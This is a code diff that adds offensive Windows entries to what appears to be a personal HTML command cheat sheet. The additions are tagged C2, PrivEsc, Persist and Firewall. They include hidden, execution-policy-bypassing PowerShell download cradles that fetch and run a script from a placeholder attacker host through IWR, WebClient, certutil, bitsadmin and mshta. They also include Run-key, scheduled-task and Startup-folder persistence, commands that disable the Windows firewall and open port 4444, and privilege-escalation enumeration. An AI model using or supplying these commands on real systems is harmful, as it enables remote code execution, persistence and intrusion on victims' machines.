@@ -91,6 +91,18 @@
   .tag.linux.active { background: var(--green); color: var(--bg); }
   .tag.git { color: var(--text); border-color: var(--text); }
   .tag.git.active { background: var(--text); color: var(--bg); }
+  .tag.c2 { color: #ff6b35; border-color: #ff6b35; }
+  .tag.c2.active { background: #ff6b35; color: var(--bg); }
+  .tag.privesc { color: #9b59b6; border-color: #9b59b6; }
+  .tag.privesc.active { background: #9b59b6; color: #fff; }
+  .tag.persist { color: #e74c3c; border-color: #e74c3c; }
+  .tag.persist.active { background: #e74c3c; color: #fff; }
+  .tag.firewall { color: #3498db; border-color: #3498db; }
+  .tag.firewall.active { background: #3498db; color: #fff; }
+  .cmd-tag.c2 { color: #ff6b35; border-color: #ff6b35; }
+  .cmd-tag.privesc { color: #9b59b6; border-color: #9b59b6; }
+  .cmd-tag.persist { color: #e74c3c; border-color: #e74c3c; }
+  .cmd-tag.firewall { color: #3498db; border-color: #3498db; }
   .cmd-count {
     text-align: center;
     font-size: 0.6rem;
@@ -194,6 +206,10 @@
   <div class="tag defender" data-filter="defender">Defender</div>
   <div class="tag linux" data-filter="linux">Linux</div>
   <div class="tag git" data-filter="git">Git</div>
+  <div class="tag c2" data-filter="c2">C2</div>
+  <div class="tag privesc" data-filter="privesc">PrivEsc</div>
+  <div class="tag persist" data-filter="persist">Persist</div>
+  <div class="tag firewall" data-filter="firewall">Firewall</div>
 </div>
 
 <div class="cmd-count" id="count">Loading...</div>
@@ -629,6 +645,210 @@ const COMMANDS = [
     tags: ["ps"],
     accent: "#00f0ff"
   }
+  {
+    title: "Fileless Beacon (Encoded) - Bypass Web Filters",
+    code: "powershell -ep bypass -w hidden -enc [BASE64_ENCODED_PAYLOAD]",
+    tags: ["ps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "IEX Download Cradle",
+    code: "IEX(IWR http://VPS_IP:PORT/b.ps1 -UseBasicParsing)",
+    tags: ["ps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "IEX Net.WebClient (Legacy)",
+    code: "IEX(New-Object Net.WebClient).DownloadString(\"http://VPS_IP:PORT/b.ps1\")",
+    tags: ["ps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "CMD Download Cradle",
+    code: "powershell -ep bypass -w hidden -nop -c \"IEX(IWR http://VPS_IP:PORT/b.ps1 -UseBasicParsing)\"",
+    tags: ["ps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Certutil Download + Execute",
+    code: "certutil -urlcache -split -f http://VPS_IP:PORT/b.ps1 %TEMP%\\b.ps1 && powershell -ep bypass -f %TEMP%\\b.ps1",
+    tags: ["ps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Bitsadmin Download + Execute",
+    code: "bitsadmin /transfer x http://VPS_IP:PORT/b.ps1 %TEMP%\\b.ps1 && powershell -ep bypass -f %TEMP%\\b.ps1",
+    tags: ["ps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "MSHTA Loader",
+    code: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass IEX(...)\"\", 0:close\")",
+    tags: ["ps", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Check Current Privileges",
+    code: "whoami /priv",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "Check User Groups",
+    code: "whoami /groups",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "Check if Admin (High Integrity)",
+    code: "whoami /groups | findstr \"S-1-16-12288\"",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "Get Local Admins",
+    code: "net localgroup administrators",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "List All Users",
+    code: "net user",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "Check Unquoted Service Paths",
+    code: "wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "Check AlwaysInstallElevated",
+    code: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "Find Stored Credentials",
+    code: "cmdkey /list",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "Check Scheduled Tasks",
+    code: "schtasks /query /fo LIST /v | findstr /i \"Task To Run\\|Run As User\"",
+    tags: ["ps", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "Registry Run Key Persistence",
+    code: "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Update\" -Value \"powershell -w hidden -c IEX(...)\"",
+    tags: ["ps", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Scheduled Task Persistence (SYSTEM)",
+    code: "schtasks /create /tn \"Update\" /tr \"powershell -w hidden -c IEX(...)\" /sc onlogon /ru SYSTEM",
+    tags: ["ps", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Scheduled Task Persistence (User)",
+    code: "schtasks /create /tn \"Update\" /tr \"powershell -w hidden -c IEX(...)\" /sc onlogon",
+    tags: ["ps", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Startup Folder Persistence",
+    code: "Copy-Item payload.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\\\"",
+    tags: ["ps", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "Check Firewall Status",
+    code: "Get-NetFirewallProfile | Select-Object Name, Enabled",
+    tags: ["ps", "firewall"],
+    accent: "#3498db"
+  },
+  {
+    title: "List Inbound Allow Rules",
+    code: "Get-NetFirewallRule -Direction Inbound -Action Allow | Select-Object Name, DisplayName",
+    tags: ["ps", "firewall"],
+    accent: "#3498db"
+  },
+  {
+    title: "Disable Windows Firewall",
+    code: "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
+    tags: ["ps", "firewall"],
+    accent: "#3498db"
+  },
+  {
+    title: "Allow Inbound Port",
+    code: "New-NetFirewallRule -DisplayName \"Allow4444\" -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow",
+    tags: ["ps", "firewall"],
+    accent: "#3498db"
+  },
+  {
+    title: "netsh Firewall Status",
+    code: "netsh advfirewall show allprofiles",
+    tags: ["ps", "firewall"],
+    accent: "#3498db"
+  },
+  {
+    title: "netsh Disable Firewall",
+    code: "netsh advfirewall set allprofiles state off",
+    tags: ["ps", "firewall"],
+    accent: "#3498db"
+  },
+  {
+    title: "Defender Full Status",
+    code: "Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Check Tamper Protection",
+    code: "Get-MpComputerStatus | Select-Object IsTamperProtected, RealTimeProtectionEnabled",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Check WinDefend Service",
+    code: "Get-Service WinDefend | Select-Object Status, StartType",
+    tags: ["defender", "ps"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "Whoami Cmdlet Bypass",
+    code: "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Hostname Cmdlet Bypass",
+    code: "$env:COMPUTERNAME",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Username Cmdlet Bypass",
+    code: "$env:USERNAME",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Get-Location (pwd)",
+    code: "(Get-Location).Path",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "IP Address (Cmdlet)",
+    code: "Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias",
+    tags: ["ps"],
+    accent: "#00f0ff"
+  },
 ];
 
 const list = document.getElementById('cmdList');
